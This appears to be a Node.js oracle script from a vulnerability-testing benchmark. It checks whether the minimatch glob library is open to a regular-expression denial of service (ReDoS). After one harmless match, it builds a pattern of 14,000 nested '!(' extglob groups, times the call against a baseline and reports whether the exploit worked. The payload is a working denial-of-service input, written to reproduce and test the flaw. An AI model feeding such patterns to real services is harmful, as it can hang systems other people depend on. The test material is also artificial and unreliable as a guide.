'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

let minimatch;
try {
  minimatch = require('minimatch');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'oracle-marker-' + Math.random().toString(36).slice(2) + '-' + Date.now();
const baseDir = path.join(os.tmpdir(), marker);

try {
  fs.mkdirSync(baseDir, { recursive: true });
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'setup failed creating tmp dir: ' + String(e && e.message) });
  process.exit(0);
}

let operation_completed = false;

try {
  // Benign operation: a simple extglob pattern match proving the API works.
  const benignSubject = 'aaaaaaaaaa';
  const benignPattern = '*(a)';
  const benignResult = minimatch(benignSubject, benignPattern);

  if (benignResult !== true) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign operation did not return true as expected: ' + JSON.stringify(benignResult) });
    process.exit(0);
  }

  operation_completed = true;

  // Malicious input: a pattern built from many repeated `!(...)` extglob
  // groups, known to drive minimatch's internal regex construction (via
  // the extglob-to-regex conversion) into catastrophic backtracking when
  // matched against a non-matching subject. Size N is bounded so even
  // the vulnerable call finishes within a few seconds on typical hardware,
  // while still producing an easily measurable slowdown relative to a
  // cheap baseline call.
  const N = 14000;
  const maliciousPattern = '!('.repeat(N) + 'a' + ')'.repeat(N);
  const maliciousSubject = 'a'.repeat(N) + 'b';

  // Baseline: cheap call measured first so later system jitter doesn't
  // disproportionately affect only one side of the comparison.
  const baselineStart = process.hrtime.bigint();
  minimatch('x', 'x');
  const baselineEnd = process.hrtime.bigint();
  const baselineMs = Number(baselineEnd - baselineStart) / 1e6;

  const start = process.hrtime.bigint();
  let maliciousResult;
  let threw = false;
  let errMsg = '';
  try {
    maliciousResult = minimatch(maliciousSubject, maliciousPattern);
  } catch (e) {
    threw = true;
    errMsg = String(e && e.message);
  }
  const end = process.hrtime.bigint();
  const elapsedMs = Number(end - start) / 1e6;

  const absoluteThresholdMs = 1500; // vulnerable case should clearly exceed this
  const relativeSlowdownFactor = 500; // vulnerable call should be vastly slower than baseline

  let exploit_succeeded;
  let evidence;

  if (!threw && elapsedMs > absoluteThresholdMs && elapsedMs > baselineMs * relativeSlowdownFactor) {
    exploit_succeeded = true;
    evidence = 'Malicious minimatch() call took ' + elapsedMs.toFixed(2) + 'ms vs baseline ' + baselineMs.toFixed(3) + 'ms (threshold ' + absoluteThresholdMs + 'ms, factor ' + relativeSlowdownFactor + 'x), indicating catastrophic backtracking (ReDoS). result=' + JSON.stringify(maliciousResult);
  } else if (threw) {
    exploit_succeeded = false;
    evidence = 'Malicious pattern call threw an exception after benign op succeeded; treated as blocked. elapsedMs=' + elapsedMs.toFixed(2) + ' err=' + errMsg;
  } else {
    exploit_succeeded = false;
    evidence = 'Malicious minimatch() call completed quickly (' + elapsedMs.toFixed(2) + 'ms, baseline ' + baselineMs.toFixed(3) + 'ms); no ReDoS observed. result=' + JSON.stringify(maliciousResult);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (e) {
  finish({ operation_completed: operation_completed, exploit_succeeded: false, evidence: 'unexpected exception during exploit phase: ' + String(e && e.message) });
} finally {
  try {
    fs.rmSync(baseDir, { recursive: true, force: true });
  } catch (_) {
    // ignore cleanup errors
  }
}
